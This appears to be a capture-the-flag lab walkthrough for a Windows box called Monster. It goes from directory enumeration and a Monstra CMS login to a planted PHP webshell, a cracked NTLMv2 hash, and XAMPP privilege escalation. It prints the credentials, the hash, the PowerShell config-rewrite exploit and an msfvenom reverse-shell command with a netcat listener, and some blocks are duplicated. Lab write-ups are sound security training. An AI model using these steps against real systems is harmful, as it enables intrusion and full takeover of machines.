Doing a directory search returns an interesting result called /blog:

┌──(kali㉿kali)-[~/Desktop/Labs/Monster]
└─$ gobuster dir -u http://192.168.145.180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php

Browsing to the /blog returns the following webpage:

From the output above, it looks like the target is running Monstra 3.0.4. Pressing the login page returns me to the following page:

http://monster.pg/blog/users/login
http://monster.pg/blog/users/login

After inserting the hostname inside /etc/hosts file, the webpage is more formatted:

Login using admin:wazowski:

Now we can plant a PHP webshell inside the blog template:

As shown below, I placed a basic PHP webshell:

Browse over to /blog/blog and use the PHP webshell to perform command execution:

Now I have a reverse shell connection on port 8443 using the PHP webshell:

After running winPEAS.exe on the machine, I obtained the NTLMv2 hash of user mike:

???????????? Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    Mike::MIKE-PC:1122334455667788:9e63427d97fa9be8225f8957649b95e4:01010000000000004c2b4297d68fdc01dce5c38c8d1b9d710000000008003000300000000000000000000000002000005745f0b31ec1924f045f0bc19ce18ddc9bbb8d3fd6dce763e75f3e1f7c01d0470a00100000000000000000000000000000000000090000000000000000000000

  Version: NetNTLMv2

I also learned the user has RDP access on the machine. Cracking the hash leads to the password Mike14:

Checking the installed applications shows the XAMPP is 7.3.10-1 which is vulnerable to Local Privilege Escalation

The steps are simple. Generate a Metasploit payload, start the listener, and run the following commands:

$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
# Insert your payload path here
$replace = "C:\temp\msf.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file
$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
# Insert your payload path here
$replace = "C:\temp\msf.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file

Transfer the payload to the target and start the listener:

┌──(kali㉿kali)-[~/Desktop/Labs/Monster]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=443 -f exe --arch x64 --platform win > msf.exe
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes

                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/Monster]
└─$ nc -lvnp 443                                                                                                       
listening on [any] 443 ...
┌──(kali㉿kali)-[~/Desktop/Labs/Monster]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=443 -f exe --arch x64 --platform win > msf.exe
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes

                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/Monster]
└─$ nc -lvnp 443                                                                                                       
listening on [any] 443 ...

Using the RDP access, I opened a PowerShell session and ran the commands from the exploit. I also started the xampp service:

PS C:\Users\Mike> $file = "C:\xampp\xampp-control.ini"
PS C:\Users\Mike> $find = ((Get-Content $file)[2] -Split "=")[1]
PS C:\Users\Mike> $replace = "C:\temp\msf.exe"
PS C:\Users\Mike> (Get-Content $file) -replace $find, $replace | Set-Content $file
PS C:\Users\Mike>
PS C:\Users\Mike> net start xampp
The service name is invalid.

More help is available by typing NET HELPMSG 2185.

PS C:\Users\Mike> sc start xampp
PS C:\Users\Mike>
PS C:\Users\Mike> $file = "C:\xampp\xampp-control.ini"
PS C:\Users\Mike> $find = ((Get-Content $file)[2] -Split "=")[1]
PS C:\Users\Mike> $replace = "C:\temp\msf.exe"
PS C:\Users\Mike> (Get-Content $file) -replace $find, $replace | Set-Content $file
PS C:\Users\Mike>
PS C:\Users\Mike> net start xampp
The service name is invalid.

More help is available by typing NET HELPMSG 2185.

PS C:\Users\Mike> sc start xampp
PS C:\Users\Mike>

After some time, I gained a reverse shell connection with the privileges of Administrator user:

┌──(kali㉿kali)-[~/Desktop/Labs/Monster]
└─$ nc -lvnp 443                                                                                                       
listening on [any] 443 ...
connect to [192.168.45.250] from (UNKNOWN) [192.168.233.180] 50547
